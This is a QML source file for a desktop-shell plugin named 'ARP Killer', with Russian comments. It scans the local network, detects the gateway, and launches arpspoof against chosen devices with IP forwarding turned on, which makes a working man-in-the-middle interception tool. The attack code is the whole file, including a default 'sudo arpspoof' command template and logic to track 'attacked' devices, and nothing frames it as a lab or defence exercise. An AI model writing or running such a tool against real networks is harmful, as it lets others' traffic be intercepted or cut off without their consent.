import QtQuick
import Quickshell.Io
import qs.Commons

Item {
    id: root
    property var pluginApi: null

    property var cfg: pluginApi?.pluginSettings || ({})
    property var defaults: pluginApi?.manifest?.metadata?.defaultSettings || ({})

    property string selectedInterface: cfg.interface ?? ""
    property int scanIntervalSec: cfg.scanIntervalSec ?? 30
    property bool autoRestore: cfg.autoRestore ?? true
    property string gatewayIp: cfg.gatewayIp ?? ""
    property string gatewayMac: cfg.gatewayMac ?? ""
    property string attackType: cfg.attackType ?? "mitm"
    property string customCommand: cfg.customCommand ?? "sudo arpspoof -i {INTERFACE} -t {VICTIM_IP} {GATEWAY_IP}"

    property var devices: []
    property var attackedDevices: []
    property var attackProcesses: ({})
    property bool forwardingEnabled: false
    property bool scanning: false

    // ------------------------------------------------------------------
    // Сканирование сети
    function scanNetwork() {
        if (!selectedInterface || !gatewayIp) {
            console.warn("Interface or gateway not set, cannot scan")
            return
        }
        if (scanning) {
            console.log("Scan already in progress, skipping")
            return
        }
        scanning = true
        scanProcess.command = ["sudo", "arp-scan", "--localnet", "--interface", selectedInterface]
        scanProcess.running = true
    }

    property Process scanProc: Process {
        id: scanProcess
        running: false
        command: []
        property string scanOutput: ""
        stdout: SplitParser {
            splitMarker: "\n"
            onRead: function(line) { if (line.trim()) scanProcess.scanOutput += line + "\n" }
        }
        onExited: {
            var lines = scanProcess.scanOutput.split("\n")
            var newDevices = []
            for (var i = 0; i < lines.length; i++) {
                var parts = lines[i].trim().split(/\s+/)
                if (parts.length >= 2 && parts[0].match(/^\d+\.\d+\.\d+\.\d+$/)) {
                    var ip = parts[0]
                    var mac = parts[1].toLowerCase()
                    if (ip === gatewayIp) continue
                    var attacked = isAttacked(ip)
                    newDevices.push({ ip: ip, mac: mac, attacked: attacked })
                }
            }
            devices = newDevices
            console.log("Found", devices.length, "devices")
            scanProcess.scanOutput = ""
            scanProcess.running = false
            scanning = false
        }
    }

    // ------------------------------------------------------------------
    // Автоопределение шлюза
    function autoDetectGateway() {
        if (!selectedInterface) {
            console.warn("Select an interface first")
            return
        }
        console.log("Auto-detecting gateway...")
        detectIp.running = true
    }

    property Process detectIpProc: Process {
        id: detectIp
        running: false
        command: ["sh", "-c", "ip route show default | awk '{print $3}'"]
        stdout: SplitParser {
            onRead: function(line) {
                var ip = line.trim()
                if (ip && ip !== "") {
                    gatewayIp = ip
                    console.log("Detected gateway IP:", gatewayIp)
                    // Отправляем ping, затем извлекаем MAC (без заголовка arp)
                    detectMac.command = ["sh", "-c", "ping -c 1 " + gatewayIp + " > /dev/null 2>&1; arp -n " + gatewayIp + " | grep -oE '([0-9a-f]{2}:){5}[0-9a-f]{2}' | head -1"]
                    detectMac.running = true
                } else {
                    console.warn("Could not detect gateway IP")
                }
            }
        }
    }

    property Process detectMacProc: Process {
        id: detectMac
        running: false
        command: []
        stdout: SplitParser {
            onRead: function(line) {
                var mac = line.trim().toLowerCase()
                console.log("MAC detection stdout: '" + mac + "'")
                if (mac && mac !== "" && mac.match(/^([0-9a-f]{2}:){5}[0-9a-f]{2}$/)) {
                    gatewayMac = mac
                    console.log("Detected gateway MAC:", gatewayMac)
                    setGateway(gatewayIp, gatewayMac)
                    // После успешного определения MAC запускаем сканирование сети (если панель открыта)
                    if (pluginApi && pluginApi.mainInstance) {
                        pluginApi.mainInstance.scanNetwork()
                    }
                } else {
                    console.warn("Could not detect MAC, raw output: '" + mac + "'")
                    // Дополнительная диагностика: выводим всю ARP-таблицу
                    var diag = Qt.createQmlObject('import Quickshell.Io; Process { command: ["arp", "-n"] }', root)
                    var out = ""
                    diag.stdout.onRead = function(l) { out += l + "\n" }
                    diag.onExited = function() { console.warn("Full arp -n output:\n" + out); diag.destroy() }
                    diag.running = true
                }
            }
        }
    }

    // ------------------------------------------------------------------
    // Работа со списком атакуемых устройств
    function isAttacked(ip) {
        for (var i = 0; i < attackedDevices.length; i++)
            if (attackedDevices[i].ip === ip) return true
        return false
    }

    function getAttackedIndex(ip) {
        for (var i = 0; i < attackedDevices.length; i++)
            if (attackedDevices[i].ip === ip) return i
        return -1
    }

    function addAttackedDevice(ip, mac) {
        if (getAttackedIndex(ip) === -1) {
            attackedDevices = attackedDevices.concat([{ ip: ip, mac: mac }])
        }
        for (var i = 0; i < devices.length; i++) {
            if (devices[i].ip === ip && !devices[i].attacked) {
                var arr = devices.slice()
                arr[i].attacked = true
                devices = arr
                break
            }
        }
    }

    function removeAttackedDevice(ip) {
        var idx = getAttackedIndex(ip)
        if (idx !== -1) {
            var newArr = attackedDevices.slice()
            newArr.splice(idx, 1)
            attackedDevices = newArr
        }
        for (var i = 0; i < devices.length; i++) {
            if (devices[i].ip === ip && devices[i].attacked) {
                var arr = devices.slice()
                arr[i].attacked = false
                devices = arr
                break
            }
        }
    }

    // ------------------------------------------------------------------
    // Запуск атаки (как в рабочем файле)
    function startAttack(ip, mac) {
        if (!selectedInterface || !gatewayIp) {
            console.warn("Cannot start attack: interface or gateway missing")
            return
        }
        if (attackProcesses[ip]) {
            console.warn("Attack already running for", ip)
            return
        }

        if (!forwardingEnabled) {
            var fwd = Qt.createQmlObject('import Quickshell.Io; Process { command: ["sudo", "sysctl", "-w", "net.ipv4.ip_forward=1"] }', root)
            fwd.running = true
            forwardingEnabled = true
            console.log("IP forwarding enabled")
        }

        var cmd = ["sudo", "arpspoof", "-i", selectedInterface, "-t", ip, gatewayIp]
        var proc = Qt.createQmlObject('import Quickshell.Io; Process { }', root, "attackProc")
        if (!proc) {
            console.error("Failed to create attack process for", ip)
            return
        }
        proc.command = cmd
        proc.running = true
        attackProcesses[ip] = proc
        addAttackedDevice(ip, mac)
        console.log("Attack started on", ip)
    }

    function stopAttack(ip) {
        var proc = attackProcesses[ip]
        if (proc) {
            proc.running = false
            proc.destroy()
            delete attackProcesses[ip]
            if (autoRestore && gatewayIp && gatewayMac) {
                var restore = Qt.createQmlObject('import Quickshell.Io; Process { command: ["sudo", "arping", "-c", "2", "-S", "' + gatewayIp + '", "' + ip + '"] }', root)
                restore.running = true
            }
        }
        removeAttackedDevice(ip)
        console.log("Attack stopped on", ip)
    }

    function stopAllAttacks() {
        var ips = Object.keys(attackProcesses)
        for (var i = 0; i < ips.length; i++) stopAttack(ips[i])
    }

    // ------------------------------------------------------------------
    // Вспомогательные
    function setGateway(ip, mac) {
        gatewayIp = ip
        gatewayMac = mac
        if (pluginApi) {
            pluginApi.pluginSettings.gatewayIp = ip
            pluginApi.pluginSettings.gatewayMac = mac
            pluginApi.saveSettings()
        }
    }

    function setInterface(iface) {
        selectedInterface = iface
        if (pluginApi) {
            pluginApi.pluginSettings.interface = iface
            pluginApi.saveSettings()
        }
    }

    Component.onCompleted: {
        console.log("ARP Killer plugin started (debug MAC)")
        if (pluginApi) {
            if (pluginApi.pluginSettings.gatewayIp) gatewayIp = pluginApi.pluginSettings.gatewayIp
            if (pluginApi.pluginSettings.gatewayMac) gatewayMac = pluginApi.pluginSettings.gatewayMac
        }
        Qt.callLater(scanNetwork, 2000)
    }
}
